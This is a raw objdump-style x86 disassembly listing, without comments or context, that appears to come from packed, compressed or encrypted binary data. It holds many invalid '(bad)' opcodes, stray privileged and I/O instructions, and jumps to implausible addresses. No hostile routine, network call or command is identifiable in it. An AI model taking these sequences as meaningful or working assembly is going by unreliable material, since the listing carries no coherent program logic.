  4144b6:	mov    ch,0x84
  4144b8:	pop    esp
  4144b9:	mov    eax,ds:0x951dfffc
  4144be:	and    ax,0x4431
  4144c2:	dec    BYTE PTR [edi+eax*2+0xfffcca]
	...
  4144d5:	add    BYTE PTR [eax],al
  4144d7:	or     eax,0xc141e695
  4144dc:	add    al,0x0
  4144de:	xor    esi,0x8
  4144e1:	lea    eax,[ebp-0x250f8]
  4144e7:	jp     0x414497
  4144e9:	mov    bl,0xa4
  4144eb:	fsubr  QWORD PTR [ebp-0x73a1703]
  4144f1:	(bad)  
  4144f2:	call   DWORD PTR [ebx]
  4144f4:	iret   
  4144f5:	mov    ds:0x44ad0dfe,al
  4144fa:	cmp    esp,0x53
  4144fd:	jo     0x4144c3
  4144ff:	std    
  414500:	jle    0x4144f4
  414502:	(bad)  
  414503:	sbb    eax,0x58b4e6ad
  414508:	scas   al,BYTE PTR es:[edi]
  414509:	std    
  41450a:	mov    DWORD PTR [edi],0x1dfffc6c
  414510:	add    al,0x0
  414512:	add    BYTE PTR [edx+0x62],cl
  414515:	add    BYTE PTR [ebp-0x39339],cl
  41451b:	jge    0x4144b1
  41451d:	std    
  41451e:	mov    ch,0x66
  414520:	scas   al,BYTE PTR es:[edi]
  414521:	std    
  414522:	call   DWORD PTR [edx+0x4e]
  414525:	das    
  414526:	jmp    DWORD PTR [ebx-0x9]
  414529:	or     eax,eax
  41452b:	pop    esp
  41452c:	jmp    0xbc81:0x5e24ff5a
  414533:	fisttp DWORD PTR [edi+0x56]
  414536:	(bad)  
  414537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414538:	je     0x41453c
	...
  41454a:	pop    esp
  41454b:	jmp    0x5e4644ba
  414550:	xchg   DWORD PTR [eax+edi*8-0x6c01a9d1],eax
  414557:	(bad)  
  414558:	inc    DWORD PTR [eax]
  41455a:	arpl   WORD PTR [esi+0x6a],bx
  41455d:	jecxz  0x4145b9
  41455f:	pop    esi
  414560:	add    cl,BYTE PTR [ebx]
  414562:	mov    ds:0x63ce7e5e,eax
  414567:	pop    esi
  414568:	add    bh,BYTE PTR ds:0x25d67
  41456e:	push   esp
  41456f:	fistp  QWORD PTR [edi]
  414571:	(bad)  
  414572:	mov    esp,0x694f6a5d
  414577:	pop    esi
  414578:	add    dl,BYTE PTR [eax+0x3b]
  41457b:	pusha  
  41457c:	leave  
  41457d:	inc    eax
  41457e:	arpl   cx,bx
  414580:	add    cl,0x9d
  414583:	into   
  414584:	push   esi
  414585:	dec    edi
  414586:	mov    eax,ecx
  414588:	or     DWORD PTR [eax],eax
  41458a:	arpl   bx,bx
  41458c:	aas    
  41458d:	or     edi,ecx
  41458f:	pop    ebp
  414590:	xchg   DWORD PTR [eax+edi*2+0x13fe56af],eax
  414597:	(bad)  
  414598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414599:	or     BYTE PTR [ebx+0x5e],ah
  41459c:	xchg   DWORD PTR [eax+ebp*2-0x4c01a939],eax
  4145a3:	mov    ah,0x13
  4145a5:	inc    ebx
  4145a6:	push   esp
  4145a7:	sbb    BYTE PTR [ebx],cl
  4145a9:	rcl    dh,0xfc
  4145ac:	jmp    0x414545
	...
  4145ba:	add    BYTE PTR [eax],al
  4145bc:	add    BYTE PTR [ebx+0x5],bh
  4145bf:	test   al,0x3
  4145c1:	out    dx,al
  4145c2:	mov    BYTE PTR [ecx],ah
  4145c4:	push   esi
  4145c5:	xor    eax,0x1b6bb84f
  4145ca:	or     ecx,DWORD PTR [esi]
  4145cc:	push   edi
  4145cd:	xlat   BYTE PTR ds:[ebx]
  4145ce:	js     0x4145fa
  4145d0:	push   esi
  4145d1:	sbb    eax,0xfcb39a4f
  4145d6:	cmc    
  4145d7:	mov    ah,0x56
  4145d9:	or     eax,0xdf88d95b
  4145de:	inc    ebx
  4145df:	out    0x56,al
  4145e1:	std    
  4145e2:	mov    ch,0x6b
  4145e4:	cmp    cl,0x4f
  4145e7:	aad    0x56
  4145e9:	pushf  
  4145ea:	pop    ebp
  4145eb:	test   DWORD PTR [edx],ebx
  4145ed:	in     al,0x4e
  4145ef:	outs   dx,DWORD PTR ds:[esi]
  4145f0:	sbb    BYTE PTR [eax],0x50
  4145f3:	mov    ebp,0x7498d556
  4145f8:	push   ebp
  4145f9:	int    0x4e
  4145fb:	lods   eax,DWORD PTR ds:[esi]
  4145fc:	nop
  4145fd:	ror    BYTE PTR [edi-0x5b],1
  414600:	push   esi
  414601:	(bad)  
  414602:	(bad)  
  414604:	push   esi
  414605:	mov    ch,0xfa
  414607:	test   al,0xcf
  414609:	jno    0x4145e8
  41460b:	ret    0x23ca
  41460e:	add    eax,0x5645e91
  414613:	jmp    0x225c42cb
  414618:	lds    ecx,FWORD PTR [edi+ecx*2+0x4e869f33]
  41461f:	imul   eax,DWORD PTR gs:[eax],0x0
	...
  41462f:	add    BYTE PTR [ebp-0x3e],dh
  414632:	pop    ebp
  414633:	push   esi
  414634:	or     al,BYTE PTR [ebx+eax*8]
  414637:	add    edi,ecx
  414639:	add    al,0x4e
  41463b:	nop
  41463c:	test   al,0x4f
  41463e:	inc    ebp
  41463f:	push   esi
  414640:	les    esp,FWORD PTR [ebx]
  414642:	adc    ch,al
  414644:	push   esp
  414645:	fdiv   st(7),st
  414647:	call   0xe94b0904
  41464c:	pusha  
  41464d:	dec    esi
  41464e:	mov    ah,0x65
  414650:	xchg   esi,eax
  414651:	dec    edi
  414652:	(bad)  
  414653:	adc    ebp,edi
  414655:	push   ss
  414656:	call   DWORD PTR [esi]
  414658:	xchg   ebp,eax
  414659:	cdq    
  41465a:	mov    ds:0xe74f8d0f,eax
  41465f:	dec    ebp
  414660:	ins    DWORD PTR es:[edi],dx
  414661:	dec    esi
  414662:	(bad)  
  414663:	(bad)  
  414664:	in     al,0x51
  414666:	std    
  414667:	div    BYTE PTR [esi-0x5241fa9a]
  41466d:	dec    edi
  41466e:	sti    
  41466f:	sbb    ah,BYTE PTR [edi-0x71210173]
  414675:	dec    edi
  414676:	icebp  
  414677:	xchg   DWORD PTR [edi+0x6],ecx
  41467a:	pcmpgtb mm2,QWORD PTR [edi+ecx*2-0x2]
  41467f:	(bad)  
  414680:	adc    eax,0x4aac8af
  414685:	jnp    0x414672
  414687:	push   0x23
  414689:	pop    esi
  41468a:	addr16 in al,dx
  41468c:	inc    ecx
  41468d:	push   cs
  41468e:	add    BYTE PTR [ecx-0x613cfb6f],ah
	...
  4146a0:	add    BYTE PTR [eax],al
  4146a2:	add    dl,ch
  4146a4:	xor    esp,DWORD PTR [edi-0x14]
  4146a7:	popa   
  4146a8:	add    eax,0x168d8100
  4146ad:	inc    DWORD PTR [esi+0x248833ea]
  4146b3:	cmp    edi,DWORD PTR [ebx-0x2f]
  4146b6:	add    DWORD PTR [esp+eax*1-0x1f071700],ecx
  4146bd:	ss pushw ss
  4146c0:	jnp    0x414693
  4146c2:	jo     0x414678
  4146c4:	pop    ebp
  4146c5:	addr16 in al,dx
  4146c7:	popa   
  4146c8:	add    eax,0x16ad4100
  4146cd:	inc    DWORD PTR [eax]
  4146cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d0:	jle    0x4146a2
  4146d2:	mov    edi,DWORD PTR [eax-0x80]
  4146d5:	inc    ebx
  4146d6:	clc    
  4146d7:	rcl    DWORD PTR [edi],0x8a
  4146da:	shl    BYTE PTR [edx],cl
  4146dc:	dec    ebp
  4146dd:	(bad)  
  4146de:	dec    DWORD PTR [edx-0x4e]
  4146e1:	jae    0x4146df
  4146e3:	ror    BYTE PTR [eax],1
  4146e5:	call   0x4a8a05
  4146ea:	mov    ebp,DWORD PTR [eax+0x7e]
  4146ed:	sar    bh,1
  4146ef:	lahf   
  4146f0:	mov    eax,0x90b0466
  4146f5:	add    al,ch
  4146f7:	nop
  4146f8:	add    BYTE PTR [eax],al
  4146fa:	add    BYTE PTR [ecx],al
  4146fc:	leave  
  4146fd:	jb     0x41470e
  4146ff:	jno    0x414717
  414701:	addr16 das 
  414703:	xor    DWORD PTR [eax-0x2],ecx
  414706:	inc    BYTE PTR [eax]
	...
  414714:	add    BYTE PTR [eax],al
  414716:	(bad)  
  414717:	mov    cl,0xe6
  414719:	xor    DWORD PTR [edx],eax
  41471b:	or     DWORD PTR [eax],eax
  41471d:	mov    edi,eax
  41471f:	pop    esi
  414720:	(bad)  
  414721:	imul   ecx,edx,0xba6a005e
  414727:	pop    esi
  414728:	add    DWORD PTR [eax-0x46],ebp
  41472b:	or     BYTE PTR [eax],al
  41472d:	rol    BYTE PTR ds:0xf6e8ee3c,0x49
  414734:	(bad)  
  414735:	inc    DWORD PTR [ebx-0x75]
  414738:	repnz inc eax
  41473a:	ror    eax,0x73
  41473d:	inc    esp
  41473e:	in     eax,0x3b
  414740:	cli    
  414741:	dec    DWORD PTR [edi+0x7dffe6b8]
  414747:	or     BYTE PTR [eax],al
  414749:	push   0x56
  41474b:	pop    edi
  41474c:	(bad)  
  41474d:	(bad)  
  41474e:	lahf   
  41474f:	mov    eax,0x87373e6
  414754:	add    BYTE PTR [ebx],cl
  414756:	arpl   WORD PTR [esi],bx
  414758:	iret   
  414759:	or     esp,DWORD PTR [ebx]
  41475b:	inc    esi
  41475c:	and    ecx,DWORD PTR [ebx-0x5e]
  41475f:	pop    esi
  414760:	mov    dl,0xe7
  414762:	inc    eax
  414763:	arpl   WORD PTR [edx],ax
  414765:	add    BYTE PTR [ecx-0x450017a2],bh
  41476b:	pusha  
  41476c:	call   0xeaa11270
  414771:	push   DWORD PTR [esi+ebx*2]
  414774:	inc    edx
  414775:	(bad)  
  414776:	mov    dh,0xee
  414778:	push   0xffffff95
	...
  414786:	add    BYTE PTR [eax],al
  414788:	add    BYTE PTR [esi+ebx*2+0x2],bl
  41478c:	mov    DWORD PTR [esi-0x778c3eb6],esp
  414792:	jbe    0x41479f
  414794:	dec    ebx
  414795:	mov    ds:0x5c9d6a5e,al
  41479a:	pop    esi
  41479b:	add    dl,BYTE PTR [eax-0x75]
  41479e:	jmp    0x41475e
  4147a0:	inc    eax
  4147a1:	arpl   WORD PTR [ebx],bp
  4147a3:	fdiv   st,st(3)
  4147a5:	sti    
  4147a6:	mov    ds:0xde4ff14,eax
  4147ab:	push   ebx
  4147ac:	je     0x414785
  4147ae:	xor    eax,0x5e6306ce
  4147b3:	stos   BYTE PTR es:[edi],al
  4147b4:	or     ah,BYTE PTR [ebx+0x20eb0608]
  4147ba:	fdivr  st,st(3)
  4147bd:	dec    ebx
  4147be:	and    edi,DWORD PTR [edi-0x27949cc0]
  4147c4:	idiv   DWORD PTR [ebx-0x5b000457]
  4147ca:	fiadd  WORD PTR [edi+0xb]
  4147cd:	or     esp,ebp
  4147cf:	mov    esi,0x94766340
  4147d4:	push   es
  4147d5:	arpl   WORD PTR [esi-0x3],bx
  4147d8:	mov    edi,0x8ada400f
  4147dd:	sub    BYTE PTR ds:0x5d1303a8,al
  4147e3:	nop
  4147e4:	or     esp,DWORD PTR [ebx+0x5]
  4147e7:	loop   0x41482c
  4147e9:	lock test edx,0x3
	...
  4147fc:	leave  
  4147fd:	add    eax,0x4b4cd946
  414802:	mov    bl,0x53
  414804:	les    esp,FWORD PTR [edi]
  414806:	add    ch,al
  414808:	inc    esp
  414809:	fucomp st(0)
  41480b:	push   edx
  41480c:	sub    al,0x4b
  41480e:	fwait
  41480f:	dec    edi
  414810:	cmp    al,0x15
  414812:	xlat   BYTE PTR ds:[ebx]
  414813:	push   edx
  414814:	sub    eax,0x3c539b4b
  414819:	sbb    eax,0x4b1d52d7
  41481e:	jnp    0x41486b
  414820:	cld    
  414821:	and    al,0xb7
  414823:	push   edx
  414824:	or     eax,0xb1bb293d
  414829:	fisttp QWORD PTR [ebx+0x66]
  41482c:	cmp    al,0x5
  41482e:	loope  0x414805
  414830:	arpl   WORD PTR [esi-0x23],ax
  414833:	mov    fs,WORD PTR [ebx+0x5]
  414836:	jmp    0x21cbec3e
  41483b:	(bad)
  41483e:	out    0xba,eax
  414840:	mov    esp,0xcd532494
  414845:	es xchg ecx,eax
  414847:	dec    edi
  414848:	xchg   ecx,eax
  414849:	inc    ebp
  41484a:	outs   dx,DWORD PTR ds:[esi]
  41484b:	push   edx
  41484c:	mov    ebp,0x655a54a
  414851:	push   cs
  414852:	out    0xd8,al
  414854:	les    edi,FWORD PTR [esi-0x57]
  414857:	scas   al,BYTE PTR es:[edi]
  414858:	add    eax,0x887f3346
  41485d:	xchg   BYTE PTR [ebx+edx*2+0x0],ch
	...
  41486c:	add    BYTE PTR [eax],al
  41486e:	add    BYTE PTR [ecx],dh
  414870:	fst    QWORD PTR [ebx+0x54c65]
  414876:	jno    0x414826
  414878:	add    eax,0x9e56ec3
  41487d:	mov    cl,0x17
  41487f:	sahf   
  414880:	dec    edx
  414881:	(bad)  
  414882:	aad    0x76
  414884:	xchg   DWORD PTR [eax+edx*4],edi
  414887:	inc    edx
  414888:	(bad)  
  414889:	(bad)  
  41488a:	call   0x4c445c3
  41488f:	repnz pop ss
  414891:	inc    ecx
  414892:	jmp    0x24618f7
  414897:	lahf   
  414898:	scas   eax,DWORD PTR es:[edi]
  414899:	enter  0x5d2a,0x2e
  41489d:	out    0xcd,eax
  41489f:	imul   eax,DWORD PTR ds:0x4deb6c00,0xba288351
  4148a9:	(bad)  
  4148aa:	hlt    
  4148ab:	not    DWORD PTR [edi]
  4148ad:	inc    ecx
  4148ae:	jmp    0x654fd2c8
  4148b3:	nop
  4148b4:	dec    edx
  4148b5:	(bad)  
  4148b6:	jmp    0xea390a54
  4148bb:	pusha  
  4148bc:	add    eax,0x521c7400
  4148c1:	dec    edi
  4148c2:	push   ebx
  4148c3:	addr16 (bad) 
  4148c6:	inc    edx
  4148c7:	pusha  
  4148c8:	dec    edx
  4148c9:	je     0x414898
  4148cb:	xor    dh,cl
  4148cd:	mov    eax,0x949a017
  4148d2:	test   eax,0x0
	...
  4148df:	add    BYTE PTR [eax],al
  4148e1:	add    BYTE PTR [ebx+ebx*8+0x55a39e7],dh
  4148e8:	add    BYTE PTR [edx+0x2f],ch
  4148eb:	int3   
  4148ec:	je     0x4148f7
  4148ee:	fmulp  st(0),st
  4148f0:	imul   ecx
  4148f2:	xchg   esp,eax
  4148f3:	stos   DWORD PTR es:[edi],eax
  4148f4:	(bad)  
  4148f5:	sbb    al,0x17
  4148f7:	bound  edi,QWORD PTR [edi-0x2c]
  4148fa:	xor    ecx,DWORD PTR [ebx-0x78]
  4148fd:	add    BYTE PTR [edi-0x53],al
  414900:	mov    eax,DWORD PTR [ebp-0x1e]
  414903:	nop
  414904:	std    
  414905:	jne    0x414919
  414907:	mov    ah,0x73
  414909:	hlt    
  41490a:	pusha  
  41490b:	push   es
  41490c:	push   DWORD PTR [ebp-0x2]
  41490f:	mov    bl,0x13
  414911:	mov    ecx,0xafe465c
  414916:	cmp    ch,BYTE PTR ds:0xb1078b2c
  41491c:	mov    DWORD PTR [eax],edx
  41491e:	iret   
  41491f:	inc    eax
  414920:	out    dx,al
  414921:	push   eax
  414922:	call   0x5cfe5cdc
  414927:	inc    esp
  414928:	dec    BYTE PTR [edx]
  41492a:	mov    ch,BYTE PTR ds:0x8a986818
  414930:	aas    
  414931:	add    BYTE PTR [ebp+0x30],cl
  414934:	out    dx,al
  414935:	call   0x41449a
  41493a:	add    ebp,eax
  41493c:	jae    0x41493f
  41493e:	leave  
  41493f:	mov    ch,0x73
  414941:	lock jb 0x414934
  414944:	add    eax,0x0
	...
  414955:	cli    
  414956:	mov    ch,0x73
  414958:	hlt    
  414959:	bound  ecx,QWORD PTR [esi+0x33]
  41495c:	(bad)  
  41495d:	std    
  41495e:	mov    ch,0x73
  414960:	cld    
  414961:	adc    bh,dh
  414963:	add    eax,0xc1c9fa00
  414968:	pop    ebx
  414969:	add    eax,edx
  41496b:	push   ebx
  41496c:	mov    ebp,DWORD PTR [esi+0xcc0c283]
  414972:	mov    dh,0xfd
  414974:	push   ebx
  414975:	and    dh,BYTE PTR [edi-0x1f]
  414978:	inc    eax
  414979:	retf   0x70bc
  41497c:	add    DWORD PTR [ecx],ecx
  41497e:	mov    dh,0x81
  414980:	cmp    eax,0x40ecd8
  414985:	arpl   WORD PTR [esi-0x2a],bx
  414988:	sbb    ah,al
  41498a:	cmp    DWORD PTR [eax+0x27],ebp
  41498d:	and    bl,BYTE PTR [esi+0x2]
  414990:	je     0x414a03
  414992:	fisttp DWORD PTR ds:0x41d35b1
  414998:	add    bh,dh
  41499a:	cmp    DWORD PTR fs:[esi+ebp*4],0xfffffff0
  41499f:	ret    0x6cff
  4149a2:	xor    DWORD PTR ds:0x3993a32b,eax
  4149a8:	ret    0x1388
  4149ab:	push   eax
  4149ac:	adc    al,0x41
  4149ae:	test   dl,0xff
  4149b1:	(bad)  [eax+0x21dec656]
  4149b7:	push   ecx
  4149b8:	inc    BYTE PTR [eax]
	...
  4149c6:	add    BYTE PTR [eax],al
  4149c8:	cmp    al,0x6
  4149ca:	add    eax,DWORD PTR [eax]
  4149cc:	arpl   WORD PTR [edx+eax*1+0x6a],si
  4149d0:	popa   
  4149d1:	neg    BYTE PTR [ecx-0x7ca19cfb]
  4149d7:	neg    DWORD PTR [edi+eiz*1]
  4149da:	xchg   BYTE PTR ds:0x89025e62,bl
  4149e0:	out    0x15,al
  4149e2:	push   ecx
  4149e3:	inc    BYTE PTR [ecx+eiz*8]
  4149e6:	test   ebx,ecx
  4149e8:	std    
  4149e9:	push   esi
  4149ea:	dec    esi
  4149eb:	dec    edi
  4149ec:	hlt    
  4149ed:	push   0x26ecfd3b
  4149f2:	pop    ebx
  4149f3:	lea    ebx,[ebp+0x5e]
  4149f6:	add    cl,BYTE PTR [ebx]
  4149f8:	mov    ds:0x63f28626,eax
  4149fd:	pop    esi
  4149fe:	add    ch,BYTE PTR [eax+0x6]
  414a01:	adc    eax,ebp
  414a03:	call   edi
  414a05:	fcom   DWORD PTR [ebx-0x3]
  414a08:	mov    esp,0x52e7b396
  414a0d:	add    eax,0xfc6303ee
  414a12:	test   al,0xff
  414a14:	loopne 0x414a59
  414a16:	call   0x6381ad1e
  414a1b:	dec    eax
  414a1c:	xchg   esi,eax
  414a1d:	inc    edi
  414a1e:	test   DWORD PTR [ebx+eiz*2],eax
  414a21:	add    eax,0x40df80e9
  414a26:	jbe    0x414a77
  414a28:	jge    0x4149de
  414a2a:	ins    DWORD PTR es:[edi],dx
  414a2b:	cdq    
	...
  414a38:	add    BYTE PTR [eax],al
  414a3a:	add    BYTE PTR [eax+0x6d4f6546],dl
  414a40:	icebp  
  414a41:	inc    esi
  414a42:	sbb    al,0x22
  414a44:	add    eax,0x48207962
  414a49:	dec    ebp
  414a4a:	dec    edi
  414a4b:	imul   eax,DWORD PTR [ebp-0xb],0xe905f487
  414a52:	add    ecx,DWORD PTR [eax-0x1800c350]
  414a58:	jbe    0x414a42
  414a5a:	add    esp,DWORD PTR [ebx+0x46]
  414a5d:	pop    ebx
  414a5e:	cmp    BYTE PTR [esi],ch
  414a60:	inc    edi
  414a61:	sbb    eax,0xe8df24da
  414a66:	add    esp,DWORD PTR [ebx+0x3]
  414a69:	add    DWORD PTR [ecx],esp
  414a6b:	pop    ebp
  414a6c:	add    eax,0xd1ccfae9
  414a71:	jg     0x414aef
  414a73:	lahf   
  414a74:	dec    ebp
  414a75:	arpl   cx,cx
  414a77:	clc    
  414a78:	mov    ch,0x80
  414a7a:	pop    edx
  414a7b:	arpl   WORD PTR [ebx],ax
  414a7d:	jmp    0xdd8ec1d0
  414a82:	clc    
  414a83:	mov    bl,0x17
  414a85:	sub    BYTE PTR [eax+ebp*2],al
  414a88:	inc    ebp
  414a89:	push   esp
  414a8a:	lods   al,BYTE PTR ds:[esi]
  414a8b:	aad    0xd0
  414a8d:	les    ecx,FWORD PTR [esi+0x77]
  414a90:	nop
  414a91:	push   cs
  414a92:	(bad)
  414a95:	jmp    FWORD PTR [eax-0x59bcf26c]
  414a9b:	jmp    0x414a23
  414a9d:	std    
  414a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  414aab:	add    BYTE PTR [eax],al
  414aad:	add    BYTE PTR ds:0x60e9fe46,bl
  414ab3:	js     0x414a39
  414ab5:	test   eax,0x39fe472e
  414aba:	mov    bh,0x7
  414abc:	add    dh,dh
  414abe:	pusha  
  414abf:	pop    ebp
  414ac0:	pop    esi
  414ac1:	out    0x60,eax
  414ac3:	add    eax,0xf19ba90b
  414ac8:	sub    BYTE PTR [eax+eiz*1],0x48
  414acc:	(bad)  
  414acd:	pushaw 
  414acf:	ror    DWORD PTR [ebx],1
  414ad1:	pop    esi
  414ad2:	retf   
  414ad3:	xchg   ch,bh
  414ad5:	push   esi
  414ad6:	lods   eax,DWORD PTR ds:[esi]
  414ad7:	ja     0x414add
  414ad9:	push   es
  414ada:	jbe    0x414aa0
  414adc:	call   DWORD PTR [ecx+0x71]
  414adf:	pop    edx
  414ae0:	sbb    DWORD PTR [esi],edi
  414ae2:	sub    ecx,DWORD PTR [edx-0x19]
  414ae5:	jge    0x414b4b
  414ae7:	add    eax,0x4e1b2e00
  414aec:	out    0x55,eax
  414aee:	fs add eax,0x47281200
  414af4:	je     0x414b07
  414af6:	mov    eax,0x60e903a4
  414afb:	js     0x414a81
  414afd:	xor    eax,0x99fe479e
  414b02:	xchg   ebp,eax
  414b03:	xchg   ecx,eax
  414b04:	(bad)  
  414b05:	imul   DWORD PTR [esi+0x6b45e747]
  414b0b:	add    eax,0x4664d000
  414b10:	(bad)  
  414b11:	fiadd  WORD PTR [eax]
	...
  414b1f:	add    BYTE PTR [eax],al
  414b21:	xchg   esi,eax
  414b22:	xchg   ecx,eax
  414b23:	(bad)  
  414b24:	xlat   BYTE PTR ds:[ebx]
  414b25:	cs inc edi
  414b27:	out    0x69,eax
  414b29:	imul   eax,DWORD PTR ds:0xc4510000,0x59
  414b30:	leave  
  414b31:	stc    
  414b32:	lea    ecx,[ecx-0x2142b614]
  414b38:	push   ebx
  414b39:	and    dh,bh
  414b3b:	in     al,0x40
  414b3d:	mov    edx,0xf90170b9
  414b42:	mov    bh,0x81
  414b44:	cmp    eax,0x40e70b
  414b49:	mov    ch,BYTE PTR ds:0x36a78307
  414b4f:	sub    al,0x41
  414b51:	jp     0x414b54
  414b53:	jne    0x414b5a
  414b55:	mov    eax,ds:0xc9c959c1
  414b5a:	mov    edi,0x17afc43
  414b5f:	add    BYTE PTR [eax],al
  414b61:	cmp    eax,0x4a00f63e
  414b66:	or     DWORD PTR [eax],eax
  414b68:	(bad)  
  414b69:	jmp    esp
  414b6b:	(bad)  
  414b6c:	(bad)  
  414b6d:	cmp    cl,BYTE PTR [ecx]
  414b6f:	mov    DWORD PTR [ebp-0x72],0x4a000009
  414b76:	retf   0xf043
  414b79:	dec    edx
  414b7a:	or     DWORD PTR [eax],eax
  414b7c:	add    BYTE PTR [edi-0x48af11b4],dh
  414b82:	dec    esp
  414b83:	repnz push eax
	...
  414b91:	add    BYTE PTR [eax],al
  414b93:	add    BYTE PTR [edi-0x1faf15b4],al
  414b99:	ror    DWORD PTR [ebx+0x68796645],1
  414b9f:	add    dh,al
  414ba1:	add    eax,0x3bf5006a
  414ba6:	jg     0x414bd6
  414ba8:	retf   
  414ba9:	or     BYTE PTR [ecx+0x7b861245],cl
  414baf:	call   0x8148a8ae
  414bb4:	arpl   cx,bx
  414bb6:	pop    ebx
  414bb7:	jmp    0x75437a1f
  414bbc:	push   edi
  414bbd:	dec    ebx
  414bbe:	aad    0xfb
  414bc0:	aam    0xe9
  414bc2:	dec    ebx
  414bc3:	cmp    BYTE PTR [esi],0x76
  414bc6:	add    dh,BYTE PTR [ecx+ebx*1-0x59]
  414bca:	lods   eax,DWORD PTR ds:[esi]
  414bcb:	idiv   DWORD PTR [eax+0x3b724b2b]
  414bd1:	xchg   esi,eax
  414bd2:	aad    0x41
  414bd4:	pushf  
  414bd5:	fwait
  414bd6:	jns    0x414c1c
  414bd8:	adc    DWORD PTR [ebx-0x100717f1],0x4c
  414bdf:	(bad)  
  414be0:	pop    eax
  414be1:	outs   dx,BYTE PTR ds:[esi]
  414be2:	(bad)  
  414be3:	and    ch,dl
  414be5:	icebp  
  414be6:	imul   esp,DWORD PTR [bx-0x7a],0xab6c315c
  414bee:	dec    ebx
  414bef:	je     0x414b74
  414bf1:	mov    bl,0xc2
  414bf3:	pop    es
  414bf4:	pop    esp
  414bf5:	popa   
  414bf6:	data16 mov es,WORD PTR [eax]
	...
  414c05:	add    BYTE PTR [eax],al
  414c07:	mov    ds:0x4a344b2a,eax
  414c0c:	js     0x414bcf
  414c0e:	call   ebp
  414c10:	sub    eax,0x6da9f89f
  414c15:	add    al,BYTE PTR [ebx+0x4c4b7a20]
  414c1b:	aas    
  414c1c:	scas   eax,DWORD PTR es:[edi]
  414c1d:	int    0xeb
  414c1f:	arpl   WORD PTR [ecx+0x1a96fe87],bx
  414c25:	dec    esp
  414c26:	adc    al,0x96
  414c28:	test   cl,al
  414c2a:	jmp    DWORD PTR ds:0x4ff4e71
  414c30:	add    al,BYTE PTR cs:[ecx-0xa6f982]
  414c37:	hlt    
  414c38:	sub    eax,0x4fa04d5
  414c3d:	inc    ebp
  414c3e:	dec    ebx
  414c3f:	in     eax,0x43
  414c41:	imul   ecx,ecx,0xfd5d04d8
  414c47:	aad    0xb9
  414c49:	int3   
  414c4a:	dec    ebx
  414c4b:	ja     0x414c0f
  414c4d:	push   ss
  414c4e:	(bad)
  414c51:	out    0x3,eax
  414c53:	arpl   WORD PTR ds:0xd9a13d12,ax
  414c59:	popa   
  414c5a:	pop    eax
  414c5b:	loope  0x414ca5
  414c5d:	mov    esp,0x23ad0db7
  414c62:	bound  ebx,QWORD PTR [ebp+eax*1-0x6f]
  414c66:	(bad)  
  414c67:	arpl   WORD PTR [eax-0x73],cx
  414c6a:	xchg   DWORD PTR [eax],eax
	...
  414c78:	add    BYTE PTR [eax],al
  414c7a:	dec    edi
  414c7b:	jp     0x414c53
  414c7d:	les    eax,FWORD PTR [ebx+eax*2+0x1e1fcf4]
  414c84:	test   al,0x1a
  414c86:	and    al,BYTE PTR ds:0xf066d0e9
  414c8c:	sub    BYTE PTR [ebx+0x7f294e09],ch
  414c92:	jg     0x414cd0
  414c94:	mov    ds:0x772e54c4,al
  414c99:	add    eax,0x20510563
  414c9e:	inc    edi
  414c9f:	inc    ebx
  414ca0:	cmp    eax,0xa2407f87
  414ca5:	les    esi,FWORD PTR [ebx+eax*2]
  414ca8:	mov    ah,0xf2
  414caa:	sub    eax,0x6f4aecb7
  414caf:	inc    eax
  414cb0:	mov    dl,0xc4
  414cb2:	sbb    al,0x2b
  414cb4:	inc    esi
  414cb5:	pop    es
  414cb6:	arpl   WORD PTR ds:0x89743e2,ax
  414cbc:	adc    dh,bl
  414cbe:	arpl   WORD PTR ds:0x41a742e9,ax
  414cc4:	(bad)  
  414cc5:	call   0x5c41522a
  414cca:	and    bh,BYTE PTR [edi]
  414ccc:	dec    edi
  414ccd:	push   ebx
  414cce:	pop    edi
  414ccf:	scas   eax,DWORD PTR es:[edi]
  414cd0:	add    esi,ebx
  414cd2:	mov    ch,0x6
  414cd4:	push   0xffffffe9
  414cd6:	sub    DWORD PTR [edi+0x45d3ce03],esi
  414cdc:	sub    eax,0x28
	...
  414ced:	pop    edi
  414cee:	push   cs
  414cef:	shl    BYTE PTR ds:0xe9882c62,0x60
  414cf6:	add    eax,0x2d633aff
  414cfb:	pop    ecx
  414cfc:	sub    BYTE PTR [eax],bl
  414cfe:	inc    ebx
  414cff:	mov    BYTE PTR [edi+ebp*1],ah
  414d02:	inc    ebx
  414d03:	jb     0x414cf2
  414d05:	cmp    BYTE PTR [eax],dh
  414d07:	add    ecx,ebp
  414d09:	pusha  
  414d0a:	aad    0xfe
  414d0c:	cld    
  414d0d:	sbb    dl,dl
  414d0f:	(bad)  
  414d10:	cli    
  414d11:	jl     0x414cbd
  414d13:	jmp    edi
  414d15:	pusha  
  414d16:	add    eax,0x426ce968
  414d1b:	(bad)  
  414d1c:	push   ecx
  414d1d:	add    eax,DWORD PTR [edi]
  414d1f:	add    cl,ch
  414d21:	pop    ebp
  414d22:	xor    BYTE PTR [ebx+0x2],0xa0
  414d26:	leave  
  414d27:	sti    
  414d28:	jmp    0x7441528d
  414d2d:	and    edi,DWORD PTR [esi]
  414d2f:	dec    edi
  414d30:	shl    DWORD PTR [eax-0x51],cl
  414d33:	add    DWORD PTR [esi],esi
  414d35:	adc    edi,DWORD PTR [edx]
  414d37:	imul   ebp,ecx,0x2603b799
  414d3d:	xor    eax,DWORD PTR [ebp+0x2d]
  414d40:	test   al,0x60
  414d42:	push   cs
  414d43:	rcr    BYTE PTR [ebp+0x11744316],0xa8
  414d4a:	push   0xcf5d0030
  414d4f:	jmp    0x414d84
	...
  414d60:	std    
  414d61:	push   ecx
  414d62:	imul   al
  414d64:	mov    ds,WORD PTR [ecx]
  414d66:	(bad)  
  414d67:	(bad)  
  414d68:	cmp    eax,0xfa412006
  414d6d:	les    eax,FWORD PTR [ebx-0x4]
  414d70:	retf   0x5
  414d73:	add    BYTE PTR [edi],bh
  414d75:	cmp    dl,0x50
  414d78:	and    BYTE PTR [ecx],cl
  414d7a:	push   0x2
  414d7c:	gs arpl si,di
  414d7f:	(bad)  
  414d80:	jns    0x414d87
  414d82:	call   DWORD PTR ds:0x411f0b
  414d88:	rol    ebp,0xd
  414d8b:	test   BYTE PTR [ebx],dl
  414d8d:	or     DWORD PTR [eax],eax
  414d8f:	add    ch,al
  414d91:	adc    esi,0x58a20
  414d97:	mov    DWORD PTR [edi-0x13],0x57affff
  414d9e:	push   DWORD PTR [ebx-0x7a]
